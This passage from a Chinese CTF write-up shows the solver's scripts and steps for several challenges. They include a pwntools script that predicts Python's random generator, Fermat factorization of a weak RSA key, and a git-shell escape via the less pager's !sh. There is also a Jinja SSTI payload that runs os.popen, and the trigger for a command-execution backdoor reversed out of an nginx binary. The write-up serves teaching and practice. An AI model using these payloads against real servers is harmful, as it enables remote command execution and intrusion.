    <span class="pl-s1">host</span> <span class="pl-c1">=</span> <span class="pl-s">'123.456.789.01'</span>
    <span class="pl-s1">port</span> <span class="pl-c1">=</span> <span class="pl-c1">12345</span>

    <span class="pl-c"># 第一步：接收 PoW 题目</span>
    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s1">host</span>, <span class="pl-s1">port</span>)
    <span class="pl-s1">line</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvuntil</span>(<span class="pl-s">b'= '</span>).<span class="pl-c1">decode</span>()
    <span class="pl-s1">target_hash</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>().<span class="pl-c1">strip</span>().<span class="pl-c1">decode</span>()
    <span class="pl-s1">prefix</span> <span class="pl-c1">=</span> <span class="pl-s1">line</span>.<span class="pl-c1">split</span>(<span class="pl-s">'+'</span>)[<span class="pl-c1">1</span>].<span class="pl-c1">split</span>(<span class="pl-s">')'</span>)[<span class="pl-c1">0</span>]  <span class="pl-c"># 提取 iMwfwaWvfBil7B9S 这样的后缀</span>
    <span class="pl-en">print</span>(<span class="pl-s">f"PoW: sha256(XXXX+<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">prefix</span><span class="pl-kos">}</span></span>) = <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">target_hash</span><span class="pl-kos">}</span></span>"</span>)

    <span class="pl-c"># 爆破 PoW</span>
    <span class="pl-s1">pow_sol</span> <span class="pl-c1">=</span> <span class="pl-en">solve_pow</span>(<span class="pl-s1">prefix</span>, <span class="pl-s1">target_hash</span>)
    <span class="pl-k">if</span> <span class="pl-s1">pow_sol</span> <span class="pl-c1">is</span> <span class="pl-c1">None</span>:
        <span class="pl-en">print</span>(<span class="pl-s">"PoW failed"</span>)
        <span class="pl-k">return</span>
    <span class="pl-en">print</span>(<span class="pl-s">f"PoW solution: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pow_sol</span><span class="pl-kos">}</span></span>"</span>)
    <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s1">pow_sol</span>.<span class="pl-c1">encode</span>())

    <span class="pl-c"># 进入主循环</span>
    <span class="pl-s1">rc</span> <span class="pl-c1">=</span> <span class="pl-en">RandCrack</span>()

    <span class="pl-c"># 第一阶段：收集前10个随机数</span>
    <span class="pl-s1">first_10_cards</span> <span class="pl-c1">=</span> []
    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">10</span>):
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-c"># 猜错（输入 0 ）</span>
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-s">b'0'</span>)
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Negative'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">line</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
            <span class="pl-c"># 解析 card = 12345678</span>
            <span class="pl-s1">card_val</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">line</span>.<span class="pl-c1">decode</span>().<span class="pl-c1">split</span>(<span class="pl-s">'='</span>)[<span class="pl-c1">1</span>].<span class="pl-c1">strip</span>())
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] card = <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">card_val</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-s1">first_10_cards</span>.<span class="pl-c1">append</span>(<span class="pl-s1">card_val</span>)
        <span class="pl-k">else</span>:
            <span class="pl-c"># 前十次都有猜对的，你应该去买彩票，你不准做题了</span>
            <span class="pl-k">return</span>

    <span class="pl-c"># r 重置</span>
    <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'R'</span>)

    <span class="pl-c"># 第二阶段：重新收集624个随机数，前10次用已知的正确值猜测</span>
    <span class="pl-s1">score</span> <span class="pl-c1">=</span> <span class="pl-c1">610</span> <span class="pl-c1">*</span> <span class="pl-c1">2</span>  <span class="pl-c"># 初始分数</span>
    
    <span class="pl-c"># 前10次使用已知的正确值</span>
    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">10</span>):
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-c"># 使用之前收集到的正确低16位</span>
        <span class="pl-s1">correct_low16</span> <span class="pl-c1">=</span> <span class="pl-s1">first_10_cards</span>[<span class="pl-s1">i</span>] <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFF</span>
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-en">str</span>(<span class="pl-s1">correct_low16</span>).<span class="pl-c1">encode</span>())
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Positive'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] Correct guess! Score: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">score</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-c"># 提交给 RandCrack（32 位）</span>
            <span class="pl-s1">rc</span>.<span class="pl-c1">submit</span>(<span class="pl-s1">first_10_cards</span>[<span class="pl-s1">i</span>] <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFFFFFF</span>)
        <span class="pl-k">else</span>:
            <span class="pl-c"># 网速较差/时间窗口没卡好</span>
            <span class="pl-s1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] Unexpected Negative!"</span>)
            <span class="pl-k">return</span>

    <span class="pl-c"># 继续收集剩余的614个随机数</span>
    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">10</span>, <span class="pl-c1">624</span>):
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-c"># 猜错（输入 0）</span>
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-s">b'0'</span>)
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Negative'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>
            <span class="pl-s1">line</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
            <span class="pl-c"># 解析 card = xxxxxxxx</span>
            <span class="pl-s1">card_val</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">line</span>.<span class="pl-c1">decode</span>().<span class="pl-c1">split</span>(<span class="pl-s">'='</span>)[<span class="pl-c1">1</span>].<span class="pl-c1">strip</span>())
            <span class="pl-en">print</span>(<span class="pl-s">f"[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-c1">+</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>] card = <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">card_val</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-c"># 提交给 RandCrack（32 位）</span>
            <span class="pl-s1">rc</span>.<span class="pl-c1">submit</span>(<span class="pl-s1">card_val</span> <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFFFFFF</span>)
        <span class="pl-k">else</span>:
            <span class="pl-c"># 你知道我要说什么</span>
            <span class="pl-k">return</span>

    <span class="pl-c"># 第三阶段：全部猜对直到分数足够</span>
    <span class="pl-k">while</span> <span class="pl-s1">score</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">9999</span>:
        <span class="pl-c"># 预测下一个随机数</span>
        <span class="pl-s1">predicted</span> <span class="pl-c1">=</span> <span class="pl-s1">rc</span>.<span class="pl-c1">predict_getrandbits</span>(<span class="pl-c1">32</span>)
        <span class="pl-s1">low16</span> <span class="pl-c1">=</span> <span class="pl-s1">predicted</span> <span class="pl-c1">&amp;</span> <span class="pl-c1">0xFFFF</span>

        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'H'</span>)
        <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'check&gt;'</span>, <span class="pl-en">str</span>(<span class="pl-s1">low16</span>).<span class="pl-c1">encode</span>())
        <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
        <span class="pl-k">if</span> <span class="pl-s">b'Positive'</span> <span class="pl-c1">in</span> <span class="pl-s1">resp</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"Score: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">score</span><span class="pl-kos">}</span></span>"</span>)
        <span class="pl-k">else</span>:
            <span class="pl-s1">score</span> <span class="pl-c1">-=</span> <span class="pl-c1">2</span>
            <span class="pl-en">print</span>(<span class="pl-s">f"Wrong prediction! Score: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">score</span><span class="pl-kos">}</span></span>"</span>)
            <span class="pl-c"># 应该不会出错</span>
            <span class="pl-k">if</span> <span class="pl-s1">score</span> <span class="pl-c1">&lt;=</span> <span class="pl-c1">0</span>:
                <span class="pl-en">print</span>(<span class="pl-s">"Score &lt;= 0, failed"</span>)
                <span class="pl-k">return</span>

    <span class="pl-c"># 分数达到 9999，Stand</span>
    <span class="pl-s1">r</span>.<span class="pl-c1">sendlineafter</span>(<span class="pl-s">b'&gt;'</span>, <span class="pl-s">b'S'</span>)
    <span class="pl-v">Flag</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">recvline</span>()
    <span class="pl-en">print</span>(<span class="pl-v">Flag</span>)
    <span class="pl-s1">r</span>.<span class="pl-c1">close</span>()

<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">'__main__'</span>:
    <span class="pl-en">main</span>()</pre></div>
<p>跑一遍程序即可拿到 Flag: <code class="notranslate">flag{303191d0-227d-440d-8cf6-7a45f378757e}</code></p>
<p>（个人建议把 600s 时限放宽一点，我一开始连接的校内 VPN 在得到两千多分的时候就超时退出了😡）</p>
<h3>Crypto05-EZRSA</h3>
<p>提供了一个 Python 文件，<del>翻代码发现 flag = b"flag{GUESS_ME_DUDE???}"，结束本题</del></p>
<p>末尾注释提供了一些 RSA 相关的数据：</p>
<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-s1">n</span> <span class="pl-c1">=</span> <span class="pl-c1">1761136274297027039963230651989531722606611852591964400481006338727378865369012452786479495394114231817718239</span>
<span class="pl-s1">e</span> <span class="pl-c1">=</span> <span class="pl-c1">65537</span>
<span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-c1">1230891216923086590416832066481981391436300928059089913296665775664238914246508186217218568669712406212992089</span></pre></div>
<p>我们需要拆解 <code class="notranslate">n</code> 这个大数（<code class="notranslate">n = p * q</code>），而不幸的是 factordb 拆不开这个数，注意到提供的代码中有这样的生成操作</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">p_bits</span> <span class="pl-c1">=</span> <span class="pl-c1">180</span>  										<span class="pl-c"># p 是 180 位的数字</span>
<span class="pl-s1">close_offset_max</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span> <span class="pl-c1">&lt;&lt;</span> <span class="pl-c1">20</span>

<span class="pl-s1">low</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span> <span class="pl-c1">&lt;&lt;</span> (<span class="pl-s1">p_bits</span> <span class="pl-c1">-</span> <span class="pl-c1">1</span>)
<span class="pl-s1">high</span> <span class="pl-c1">=</span> (<span class="pl-c1">1</span> <span class="pl-c1">&lt;&lt;</span> <span class="pl-s1">p_bits</span>) <span class="pl-c1">-</span> <span class="pl-c1">1</span>

<span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-s1">random</span>.<span class="pl-c1">randrange</span>(<span class="pl-s1">low</span>, <span class="pl-s1">high</span>)						
<span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">next_prime</span>(<span class="pl-s1">a</span>)									<span class="pl-c"># 生成 180 位的随机素数 p</span>
<span class="pl-s1">offset</span> <span class="pl-c1">=</span> <span class="pl-s1">random</span>.<span class="pl-c1">randint</span>(<span class="pl-c1">1000</span>, <span class="pl-s1">close_offset_max</span>)		<span class="pl-c"># 生成一个偏移量，在 1000 ~ 2^20 之间</span>
<span class="pl-s1">q</span> <span class="pl-c1">=</span> <span class="pl-en">next_prime</span>(<span class="pl-s1">p</span> <span class="pl-c1">+</span> <span class="pl-s1">offset</span>)							<span class="pl-c"># p 加上偏移量后调整生成素数 q</span>
<span class="pl-k">if</span> <span class="pl-s1">p</span> <span class="pl-c1">==</span> <span class="pl-s1">q</span>:
    <span class="pl-k">continue</span>

<span class="pl-s1">n</span> <span class="pl-c1">=</span> <span class="pl-s1">p</span> <span class="pl-c1">*</span> <span class="pl-s1">q</span></pre></div>
<p>也就是说 <code class="notranslate">p,q</code> 的位数大致固定，且 <code class="notranslate">q - p</code> 差值比较小，考虑使用 Fermat 质数分解算法：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">def</span> <span class="pl-en">fermat_factorization</span>(<span class="pl-s1">n</span>):
    <span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-s1">gmpy2</span>.<span class="pl-c1">isqrt</span>(<span class="pl-s1">n</span>)
    <span class="pl-k">while</span> <span class="pl-c1">True</span>:
        <span class="pl-s1">b2</span> <span class="pl-c1">=</span> <span class="pl-s1">a</span> <span class="pl-c1">*</span> <span class="pl-s1">a</span> <span class="pl-c1">-</span> <span class="pl-s1">n</span>
        <span class="pl-k">if</span> <span class="pl-s1">gmpy2</span>.<span class="pl-c1">is_square</span>(<span class="pl-s1">b2</span>):
            <span class="pl-s1">b</span> <span class="pl-c1">=</span> <span class="pl-s1">gmpy2</span>.<span class="pl-c1">isqrt</span>(<span class="pl-s1">b2</span>)
            <span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-s1">a</span> <span class="pl-c1">-</span> <span class="pl-s1">b</span>
            <span class="pl-s1">q</span> <span class="pl-c1">=</span> <span class="pl-s1">a</span> <span class="pl-c1">+</span> <span class="pl-s1">b</span>
            <span class="pl-k">return</span> <span class="pl-en">int</span>(<span class="pl-s1">p</span>), <span class="pl-en">int</span>(<span class="pl-s1">q</span>)
        <span class="pl-s1">a</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span></pre></div>
<p>带入到具体数据跑一遍程序就可以拿到 Flag：<code class="notranslate">flag{RSA_is_weak_when_p_approx_q}</code>，Flag 说得对</p>
<hr>
<p>PWN 题我都不会写，对不起出题者😭</p>
<hr>
<h3>Web01-逃离</h3>
<blockquote>
<p>在一次渗透测试中，你通过一个文件读取漏洞得到了用户名 git 的 SSH 私钥<br>
使用给定的 SSH 私钥和用户名 git 登录指定的地址，从 Gitshell 里逃离</p>
<p>flag 在 /home/git 下</p>
</blockquote>
<p>目标是从高度受限的 Gitshell 环境中想办法来到普通 Shell 环境中，读取 <code class="notranslate">/home/git</code> 的内容</p>
<p>先用 SSH 试探一下（<code class="notranslate">id_rsa</code> 是下发的私钥文件）：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345
fatal: unrecognized <span class="pl-c1">command</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
Connection to xxx.xxx.xxx.xx closed.</pre></div>
<p>坏透了，这个 Git 服务器不允许交互式输入指令，我只能在 SSH 请求时附带我的指令：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span>
fatal: unrecognized <span class="pl-c1">command</span> <span class="pl-s"><span class="pl-pds">'</span>help<span class="pl-pds">'</span></span></pre></div>
<p><code class="notranslate">help</code> 都不能用？经过测试和查询，只有 <code class="notranslate">git receive-pack</code> <code class="notranslate">git upload-pack</code> <code class="notranslate">git upload-archive</code> 可以使用，那就找个仓库上传些什么东西做个手脚：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>git upload-pack '/home/git'<span class="pl-pds">"</span></span>
fatal: <span class="pl-s"><span class="pl-pds">'</span>/home/git<span class="pl-pds">'</span></span> does not appear to be a git repository</pre></div>
<p>又经过测试，这个环境里面没有 git 仓库（至少我没找到），我决定 <code class="notranslate">--help</code> 一下</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>git upload-pack '--help'<span class="pl-pds">"</span></span>
GIT-UPLOAD-PACK(1)                Git Manual                GIT-UPLOAD-PACK(1)

NAME
       git-upload-pack - Send objects packed back to git-fetch-pack

SYNOPSIS
       git-upload-pack [--[no-]strict] [--timeout<span class="pl-k">=&lt;</span>n<span class="pl-k">&gt;</span>] [--stateless-rpc]
                         [--advertise-refs] <span class="pl-k">&lt;</span>directory<span class="pl-k">&gt;</span>
       DESCRIPTION

       <span class="pl-c"><span class="pl-c">#</span> ... 太多了不贴了</span>

SEE ALSO
       gitnamespaces(7)

GIT
       Part of the git(1) suite

Git 2.12.2                        12/25/2020                GIT-UPLOAD-PACK(1)
<span class="pl-k">&gt;</span> <span class="pl-c"><span class="pl-c">#</span> 直接退出 SSH 连接了</span></pre></div>
<p><del>这是我目前成功运行的唯一一条指令</del>，输出页面让我想到了 <code class="notranslate">man</code> 指令，印象里帮助页面应该用 <code class="notranslate">less</code> 分页器打开，而 <code class="notranslate">less</code> 分页器 有 <code class="notranslate">!sh</code> 的操作可以打开子 <code class="notranslate">shell</code> 实现逃逸。查询得知需要在 SSH 连接时加上 <code class="notranslate">-t</code> 参数强制分配伪终端：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -t -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>git upload-pack '--help'<span class="pl-pds">"</span></span>
<span class="pl-c"><span class="pl-c">#</span> 用 less 打开了帮助文档，输入 !sh 进入子 shell</span>
$ cat /home/git/flag.txt
Trinity{GIT_5HE11_byp@ss_OOOOO_060524592cce19c7}$</pre></div>
<p>获得了 Flag <code class="notranslate">Trinity{GIT_5HE11_byp@ss_OOOOO_060524592cce19c7}</code></p>
<p><strong>Web02-逻辑鬼才</strong> 没有进展，不懂 HTTPDigestAuth :(</p>
<h3>Web03-Hello Flask!</h3>
<blockquote>
<p>我学会的第一行代码就是<code class="notranslate">cout&lt;&lt;"Hello Flask!"&lt;&lt;endl;</code></p>
<p>flag 在 /etc/flag.txt</p>
<p>访问：<code class="notranslate">http://ip:port/?name=123</code></p>
</blockquote>
<p>先按照他说的访问一下 <code class="notranslate">http://ip:port/?name=123</code>，HTML 页面只有一句 <em>Hello 123</em></p>
<p>STFW 了解到 Flask 是 Python 的 Web 框架，使用 Jinja 模板引擎，又不小心搜到了 [<a href="https://hello-ctf.com/hc-web/ssti/" rel="nofollow">SSTI注入 - Hello CTF</a>](<a href="https://hello-ctf.com/hc-web/ssti/" rel="nofollow">https://hello-ctf.com/hc-web/ssti/</a>) 了解了一下</p>
<blockquote>
<p><em>一般我们会在疑似的地方尝试插入简单的模板表达式，如 <code class="notranslate">{{7*7}}</code> <code class="notranslate">{{config}}</code>，看看是否能在页面上显示预期结果，以此确定是否有注入点。</em></p>
</blockquote>
<p>插入一下试试： <code class="notranslate">http://ip:port/?name={{7*7}}</code>，HTML 页面输出 <em>Hello 49</em>，看来有注入点</p>
<p>经过和 AI 的反复修改后得到了下面的模板：</p>
<div class="highlight highlight-source-python"><pre class="notranslate">{{<span class="pl-s1">cycler</span>.<span class="pl-c1">__init__</span>.<span class="pl-c1">__globals__</span>.<span class="pl-c1">__builtins__</span>.<span class="pl-c1">__import__</span>(<span class="pl-s">'os'</span>).<span class="pl-c1">popen</span>(<span class="pl-s">'cat /etc/flag.txt'</span>).<span class="pl-c1">read</span>()}}
<span class="pl-c"># 从 cycler 对象开始（Jinja2模板的默认对象），通过 __init__ 获取初始化方法， __globals__ 获取全局命名空间， __builtins__ 获取内置函数， __import__('os') 导入os模块，最终调用 popen() 执行系统命令，read() 进行读取，输出在 HTML 页面上</span></pre></div>
<p>得到 Flag <code class="notranslate">Trinity{ssti_is_Funnnnnny!422144319e480db2}</code></p>
<hr>
<h3>RE01-带后门的nginx</h3>
<blockquote>
<p><strong>描述：</strong> xx大学近日遭受一起 APT 攻击：黑客组织通过购买搜索引擎推广，将其精心伪造的 nginx 官网置于搜索结果首位。某运维人员因而下载了该网站上被植入后门的 nginx。服务上线后，黑客组织通过该后门长期隐蔽地从内网盗取信息。你的任务是通过逆向工程找到该后门的访问方式，并复现该后门来读取服务后台的 flag。</p>
<p>该后门为命令执行后门，并被符合要求的 HTTP 请求触发。找到触发方式后，你可以构造任意命令。</p>
<p>读取 flag 可以使用反弹 shell，也可以把 flag 文件拷贝到网站根目录。其中 flag 位于 /flag，nginx 网站位于 /nginx/html。</p>
</blockquote>
<p>下发了一个 <code class="notranslate">nginx</code> 文件，使用 DIE 检测为 <code class="notranslate">ELF64</code> ，使用 Ghidra 进行逆向，分析逆向内容。</p>
<p>因为我不熟悉 nginx 反编译后的内容，偶然搜索了一下含 "flag" 的字符串</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2e14dd0fde65cfa85ca132b6e38c7564e1327c4e664907f5728c734b6db0fa8c/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138333235353235342e706e67"><img src="https://camo.githubusercontent.com/2e14dd0fde65cfa85ca132b6e38c7564e1327c4e664907f5728c734b6db0fa8c/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138333235353235342e706e67" alt="image-20251006183255254" data-canonical-src="https://nopthon.github.io/image-20251006183255254.png" style="max-width: 100%;"></a></p>
<p>找到了这个有趣的内容：</p>
<div class="highlight highlight-source-assembly"><pre class="notranslate"><span class="pl-en">                             s_This_is_a_fake_flag!_001b8f5c                 XREF</span><span class="pl-s1">[</span><span class="pl-c1">3</span><span class="pl-s1">]</span><span class="pl-en">:     ngx_http_static_handler:0018a078</span>
<span class="pl-en">                                                                                         ngx_http_static_handler:0018a087</span>
<span class="pl-en">                                                                                          001dd540 (</span><span class="pl-s1">*</span><span class="pl-en">)   </span>
<span class="pl-en">        001b8f5c </span><span class="pl-c1">54</span><span class="pl-en">  </span><span class="pl-c1">68</span><span class="pl-en">  </span><span class="pl-c1">69</span><span class="pl-en">       </span><span class="pl-v">ds</span><span class="pl-en">         </span><span class="pl-s">"This_is_a_fake_flag!"</span>
<span class="pl-en">                 </span><span class="pl-c1">73</span><span class="pl-en">  5f  </span><span class="pl-c1">69</span><span class="pl-en"> </span>
<span class="pl-en">                 </span><span class="pl-c1">73</span><span class="pl-en">  5f  </span><span class="pl-c1">61</span><span class="pl-en"> </span>
</pre></div>
<p>我相信假 flag 不可能一点用都没有，于是定位到调用了这部分字符串的函数 <code class="notranslate">ngx_http_static_handler</code>，下面截取了有用的内容：</p>
<div class="highlight highlight-source-c++"><pre class="notranslate">__s = g_flag;	<span class="pl-c"><span class="pl-c">//</span> g_flag 的内容就是 "This_is_a_fake_flag!"</span>

<span class="pl-c"><span class="pl-c">//</span> 将 password 硬编码为神秘值，然后与 g_flag 进行异或运算（解密）得到新的 password</span>
<span class="pl-en">builtin_memcpy</span>(password,<span class="pl-s"><span class="pl-pds">"</span>#1<span class="pl-cce">\x03\x17</span>.<span class="pl-cce">\x10\n\x135</span>/<span class="pl-cce">\x16</span>$<span class="pl-cce">\r</span>6&lt;<span class="pl-cce">\x0e</span> ,<span class="pl-cce">\x13F</span><span class="pl-pds">"</span></span>,<span class="pl-c1">0x14</span>);
<span class="pl-k">for</span> (uVar16 = <span class="pl-c1">0</span>; <span class="pl-smi">sVar4</span> = strlen(__s), uVar16 &lt; <span class="pl-smi">sVar4</span>; uVar16 = uVar16 + <span class="pl-c1">1</span>) {
  password[uVar16] = password[uVar16] ^ __s[uVar16];
}
nVar5 = ngx_http_arg(r,password,uVar16,&amp;arg_value);				<span class="pl-c"><span class="pl-c">//</span> 从HTTP请求中获取 password 这个参数</span>
																<span class="pl-c"><span class="pl-c">//</span> 返回 0 表示找到了这个参数</span>
<span class="pl-k">if</span> ((nVar5 == <span class="pl-c1">0</span>) &amp;&amp; (arg_value.len - <span class="pl-c1">1</span> &lt; <span class="pl-c1">0x3ff</span>)) {
    _Var2 = <span class="pl-c1">fork</span>();
    <span class="pl-k">if</span> (_Var2 == <span class="pl-c1">0</span>) {
        <span class="pl-c"><span class="pl-c">//</span> 子进程执行</span>
        iVar3 = <span class="pl-c1">getrlimit64</span>(RLIMIT_NOFILE,(rlimit64 *)&amp;rlim);
        <span class="pl-c"><span class="pl-c">//</span> 关闭所有文件描述符</span>
        <span class="pl-k">for</span> (; __fd &lt; iVar18; __fd = __fd + <span class="pl-c1">1</span>) {
            <span class="pl-c1">close</span>(__fd);
        }
        <span class="pl-c"><span class="pl-c">//</span> 执行系统命令，也就是说我可以构造 http://ip:port/?password=cp /flag /nginx/html/flag.txt</span>
        <span class="pl-c"><span class="pl-c">//</span> 把 flag 文件拷贝到网站根目录</span>
        <span class="pl-c1">execl</span>(<span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sh<span class="pl-pds">"</span></span>,&amp;DAT_001b8f1b,local_528,<span class="pl-c1">0</span>);
        <span class="pl-c1">exit</span>(<span class="pl-c1">0x7f</span>);
    }
}</pre></div>
<p>对 <code class="notranslate"> "#1\x03\x17.\x10\n\x135/\x16$\r6&lt;\x0e ,\x13F"</code> 与 <code class="notranslate">"This_is_a_fake_flag!"</code> 进行异或解密得到 <code class="notranslate">password = wYjdqyyLTppEfSchLMtg</code></p>
<p>先 <code class="notranslate">http://ip:port/?wYjdqyyLTppEfSchLMtg=cp /flag /nginx/html/flag.txt</code> 把 flag 文件拷贝到网站根目录，然后 <code class="notranslate">http://ip:port/flag.txt</code> 就能获得 Flag: <code class="notranslate">flag{17a7f10e-f07c-4e3f-a080-8b91d94245b4}</code></p>
<h3>RE02-ITSC正版Office激活工具</h3>
<blockquote>
<p><strong>描述：</strong> 这是xx大学 ITSC 的会员制 Office 激活工具，必须每个月上交 114514 块钱网费才能获得激活码。你的任务是通过逆向工程破解该工具，找到激活码的生成方式，并生成用户 <code class="notranslate">itsc</code> 的激活码。</p>
<p>获得激活码后，在外面包裹 <code class="notranslate">flag{}</code> 提交，如激活码是 <code class="notranslate">0123456789abcdef</code>，则提交 <code class="notranslate">flag{0123456789abcdef}</code>。</p>
</blockquote>
<p><del>我已经等不及了，快点端上来罢</del></p>
<p>下发了一个 <code class="notranslate">OfficeActivationTool.exe</code> 和一堆 Qt6 的依赖，不需要用 DIE 分析了</p>
<p>打开 exe 文件弹出一个激活窗口：</p>
